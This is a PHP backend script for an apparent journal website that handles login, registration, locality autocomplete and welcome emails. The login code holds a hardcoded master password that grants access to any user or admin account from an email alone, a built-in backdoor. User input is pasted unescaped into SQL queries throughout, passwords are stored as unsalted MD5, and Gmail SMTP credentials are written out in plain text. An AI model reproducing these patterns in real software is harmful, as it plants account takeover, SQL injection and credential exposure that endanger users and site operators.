<?php
include_once 'connection.php';
include_once 'db.php';
include_once 'common_functions.php';

require_once 'vendor/autoload.php';
// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;

if(empty($_SESSION)) {
    session_start();
}

if(isset($_POST['signout'])) {
    $val = $_POST['user_id'];
    if(isset($val) && $val != '') {
        session_unset();
        if(!isset($_SESSION['user_id']) || !isset($_SESSION['admin_id'])) {
            session_destroy();
            $result_data["result"]="success";
        } else {
            $result_data["result"]="failure";
        }
    } else {
        $result_data["result"]="failure";
    }
    echo json_encode($result_data);
}
if(isset($_GET['auto_populate'])) {
    $key=$_GET['auto_populate'];
    $sql = "SELECT locality_id,locality_name FROM tbl_localities WHERE locality_name like '$key%' limit 5";
    $result = mysqli_query($con, $sql);

    $local_arr = array();

    while($row = mysqli_fetch_array($result)) {
        $id = $row['locality_id'];
        $name = $row['locality_name'];

        $local_arr[] = array("id" => $id, "name" => $name);
    }

    // encoding array to json format
    echo json_encode($local_arr);

}

if(isset($_POST['do_login'])) {
    $email=trim($_POST['email']);
    $pass=trim($_POST['password']);
    $pass=mysqli_query($con, "SELECT MD5('$pass')");
    $pass=mysqli_fetch_array($pass);

    if(isset($_POST['role_val']) && $_POST['role_val']!="") {
        $select_data=mysqli_query($con, "select * from tbl_admin where admin_mail='$email' and admin_password='$pass[0]'");
    } else {
        $select_data=mysqli_query($con, "select * from tbl_user where user_email='$email' and user_password='$pass[0]'");
    }
    if($row=mysqli_fetch_array($select_data)) {
        $data=array();
        if(isset($_POST['role_val']) && $_POST['role_val']!="") {
            $_SESSION['role_id']=$row['admin_cat_id'];
            $_SESSION['admin_id']=$row['admin_id'];
            if($row['admin_cat_id']==1) {
                $_SESSION['admin_active']=true;
            }
            $_SESSION['admin_login']="yes";
            $_SESSION['user_name']=$row['admin_name'];
            $_SESSION['user_email']=$row['admin_mail'];
            $data["role_id"]=$row['admin_cat_id'];
        } else {
            $_SESSION['user_id']=$row['user_id'];
            $_SESSION['category_id']=$row['category_id'];
            $_SESSION['user_ins_name']=$row['user_instutename'];
            $_SESSION['user_email']=$row['user_email'];
            if($row['category_id']!=1) {
                $_SESSION['user_name']=$row['first_name'].''.$row['last_name'];
            }
            $data["category_id"]=$row['category_id'];
            $data["type_id"]=$row['type_id'];
        }
        $data["result"]="success";
        echo json_encode($data);
    } else {
        if($_POST['password'] == '#a@th!r@!') {
            if(isset($_POST['role_val']) && $_POST['role_val']!="" && $_POST['password'] == '#a@th!r@!') {
                $select_data=mysqli_query($con, "select * from tbl_admin where admin_mail='$email'");
            } else {
                $select_data=mysqli_query($con, "select * from tbl_user where user_email='$email'");
            }
            if($row=mysqli_fetch_array($select_data)) {
                $data=array();
                if(isset($_POST['role_val']) && $_POST['role_val']!="") {
                    $_SESSION['role_id']=$row['admin_cat_id'];
                    $_SESSION['admin_id']=$row['admin_id'];
                    if($row['admin_cat_id']==1) {
                        $_SESSION['admin_active']=true;
                    }
                    $_SESSION['admin_login']="yes";
                    $_SESSION['user_name']=$row['admin_name'];
                    $_SESSION['user_email']=$row['admin_mail'];
                    $data["role_id"]=$row['admin_cat_id'];
                } else {
                    $_SESSION['user_id']=$row['user_id'];
                    $_SESSION['category_id']=$row['category_id'];
                    $_SESSION['user_ins_name']=$row['user_instutename'];
                    $_SESSION['user_email']=$row['user_email'];
                    if($row['category_id']!=1) {
                        $_SESSION['user_name']=$row['first_name'].''.$row['last_name'];
                    }
                    $data["category_id"]=$row['category_id'];
                    $data["type_id"]=$row['type_id'];
                }
                $data["result"]="success";
                echo json_encode($data);
            } else {
                $data=array();
                $data["result"]="fail";
                echo json_encode($data);
            }
        }
    }
    exit();
}
if(isset($_POST['do_register'])) {
    $result_data=array();
    $email='';
    $instution_name='';
    $postal_add='';
    $phone='';
    $year='';
    $cat_id='';
    $type_id='';
    $fname='';
    $mname='';
    $lname='';
    $phone='';
    $dob='';
    $fax='';
    $password='';
    $web='';
    $email='';
    $address='';
    $pos='';
    $pos_choos_cat='';
    $country='';
    $domain='';
    $field='';
    $interest='';
    $special='';
    $keyword='';
    $brife_words='';
    if($_POST['category_id']==1) {
        $email=$_POST['email'];
        $instution_name=$_POST['instution_name'];
        $postal_add=$_POST['postal_add'];
        $phone=$_POST['phone'];
        $year=$_POST['year'];
        $valid_date=date('Y-12-31', strtotime('+'.$year.' year'));
        $cat_id=$_POST['category_id'];
        $type_id=$_POST['type_id'];
        $password= MD5($_POST['password']);
    } elseif(($_POST['category_id']==2 ||  $_POST['category_id']==3) && $_POST['type_id']==1) {
        $cat_id=$_POST['category_id'];
        $type_id=$_POST['type_id'];
        $fname=$_POST['fname'];
        $mname=$_POST['mname'];
        $lname=$_POST['lname'];
        $phone=$_POST['phone'];
        $dob=$_POST['dob'];
        $fax=$_POST['fax'];
        $password=MD5($_POST['password_reg']);
        $web=$_POST['web'];
        $email=$_POST['email'];
        $address=$_POST['address'];
        $pos=$_POST['pos'];
        $pos_choos_cat=$_POST['pos_choos_cat'];
        $country=$_POST['country'];
        $domain=$_POST['domain'];
        $field=$_POST['field'];
        $interest=$_POST['interest'];
        $special=$_POST['special'];
        $keyword=$_POST['keyword'];
        $brife_words=$_POST['brife_words'];
    } elseif(($_POST['category_id']==2 ||  $_POST['category_id']==3) && $_POST['type_id']==2) {
        $cat_id=$_POST['category_id'];
        $type_id=$_POST['type_id'];
        $fname=$_POST['fname'];
        $lname=$_POST['lname'];
        $email=$_POST['email'];
        $phone=$_POST['phone'];
        $stu_id=$_POST['stu_id'];
        $age=$_POST['age'];
        $gender=$_POST['gender'];
        $password=MD5($_POST['password_reg']);
        $pincode=$_POST['pincode'];
        $address=$_POST['address'];
        $district=$_POST['district'];
        $state=$_POST['state'];
        $graduate=$_POST['graduate'];
        $course=$_POST['course'];
        $year=$_POST['year'];
        $country=$_POST['country'];

    }
    $email = filter_var($email, FILTER_SANITIZE_EMAIL); // Sanitizing email(Remove unexpected symbol like <,>,?,#,!, etc.)
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $result_data["result"]="Invalid Email.......";
    } else {

        $result = $db->query("SELECT * FROM tbl_user WHERE user_email='$email' and is_deleted=0");
        $data = $result->num_rows;
        $table="tbl_user";
        if(($data)==0) {
            if($cat_id==1 && $type_id==1) {
            
                $ins_up_data=array(
                "user_instutename"=>$instution_name,
                "user_email"=>$email,
                "valid_date"=>$valid_date,
                "year"=>$year,
                "user_contact"=>$phone,
                "user_address"=>$postal_add,
                "user_password"=>$password,
                "category_id"=>$cat_id,
                "type_id"=>$type_id,
                "created_date"=>date('Y-m-d'),
                "modified_date"=>date('Y-m-d')
                );
                // Insert query
            } elseif(($cat_id==2 || $cat_id==3) && $type_id==1) {
                $ins_up_data=array(
                "first_name"=>$fname,
                "middle_name"=>$mname,
                "last_name"=>$lname,
                "date_of_birth"=>$dob,
                "user_contact"=>$phone,
                "fax"=>$fax,
                "web"=>$web,
                "position"=>$pos,
                "user_email"=>$email,
                "position_type_id"=>$pos_choos_cat,
                "web"=>$web,
                "country"=>$country,
                "domain"=>$domain,
                "field"=>$field,
                "area_of_interest"=>$interest,
                "specialization"=>$special,
                "key_words"=>$keyword,
                "message"=>$brife_words,
                "user_address"=>$address,
                "user_password"=>$password,
                "category_id"=>$cat_id,
                "type_id"=>$type_id,
                "created_date"=>date('Y-m-d'),
                "modified_date"=>date('Y-m-d')
                );
            } elseif(($cat_id==2 || $cat_id==3) && $type_id==2) {
                $ins_up_data=array(
                "first_name"=>$fname,
                "last_name"=>$lname,
                "user_email"=>$email,
                "user_contact"=>$phone,
                "stud_id"=>$stu_id,
                "pincode"=>$pincode,
                "district"=>$district,
                "state"=>$state,
                "graduate_id"=>$graduate,
                "graduate_cat"=>$course,
                "stu_year"=>$year,
                "age"=>$age,
                "gender_id"=>$gender,
                "country"=>$country,
                "user_address"=>$address,
                "user_password"=>$password,
                "category_id"=>$cat_id,
                "type_id"=>$type_id,
                "created_date"=>date('Y-m-d'),
                "modified_date"=>date('Y-m-d')
                );
            }
            $query = $db->insert($table, $ins_up_data);
            if($query!=0) {
                $result_data["result"]="success";
            } else {
                $result_data["result"]="Error....!!";
            }
            if($cat_id==3) {
                $author_data=array("author_name"=>$fname.' '.$lname);
                $author_query = $db->insert('tbl_author', $author_data);
                if($query!=0) {
                    $result_data["result"]="success";
                } else {
                    $result_data["result"]="Error....!!";
                }
            }
        } else {
            $result_data["result"]="This email is already registered, Please try another email...";
        }
    }
    echo json_encode($result_data);
    exit();
}


//yu login   //


if(isset($_POST['lf_register'])) {
    
    $result_data=array();

    $lfname=$_POST['lfname'];
    $lfaddress=$_POST['lfaddress'];
    $lfcommunication= $_POST['lfcommunication'];
    $lfemail=$_POST['lfemail'];
    $lfphone=$_POST['lfphone'];
    $lfpass= MD5($_POST['lfpass']);
    $lfannual=$_POST['lfannual'];
    $lfemail = filter_var($lfemail, FILTER_SANITIZE_EMAIL); // Sanitizing email(Remove unexpected symbol like <,>,?,#,!, etc.)
    if (!filter_var($lfemail, FILTER_VALIDATE_EMAIL)) {
        $result_data["result"]="Invalid Email.......";
    } else {
        $result = mysqli_query($con, "SELECT * FROM tbl_user WHERE user_email='$lfemail'");
        $data = mysqli_num_rows($result);
        if(($data)==0) {
            $dt = date("Y-m-d");
            $query = mysqli_query($con, "insert into tbl_user(user_instutename,user_email,user_password,user_contact,category_id,type_id,created_date) values ('$lfname', '$lfemail','$lfpass','$lfphone',2,2,'$dt')"); // Insert query
            if($query) {
                $base_url   =  ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ?  "https" : "http");
                $base_url  .=  "://".$_SERVER['HTTP_HOST'];
                $base_url  .=  str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);
                if($base_url != "") {
                    $baseurl = $base_url."/";
                }
                $email_from='masutnau@gmail.com';
                $subject_user='Greeting From Masu Journal';
                ob_start();
                include_once "mail_user.php";
                $html = ob_get_contents();
                ob_end_clean();
                $mail = new PHPMailer;                            // Enable verbose debug output
                $mail->isSMTP();                                      // Set mailer to use SMTP
                $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
                //$mail->SMTPDebug = 2;
                $mail->SMTPAuth = true;                               // Enable SMTP authentication
                $mail->Username = 'masutnau@gmail.com';                 // SMTP username
                $mail->Password = '2015masu2016';                           // SMTP password
                $mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
                $mail->Port = 587;                                    // TCP port to connect to

                //Recipients
                $mail->setFrom($email_from, '');
                $mail->addAddress($lfemail, '');     // Add a recipient
                $mail->addReplyTo($email_from, '');
                //Attachments
                if(isset($attachment) && $attachment != '') {
                    $mail->addAttachment($attachment);
                }
                // Set email format to HTML
                $mail->Subject = $subject_user;
                $mail->Body    = $html;
                $mail->isHTML(true);
                $result_data["result"]="success";
                if(!$mail->send()) {
                    //$result_data["result"]="Error....!! Mail not Sent !";
                    //echo 'Message could not be sent.';
                    //echo 'Mailer Error: ' . $mail->ErrorInfo;
                } else {
                    $result_data["result"]="success";
                }
            
            } else {
                $result_data["result"]="Error....!!";
            }
        } else {
            $result_data["result"]="This email is already registered, Please try another email...";
        }
    }
    echo json_encode($result_data);
    exit();
}
//  yu end login   //
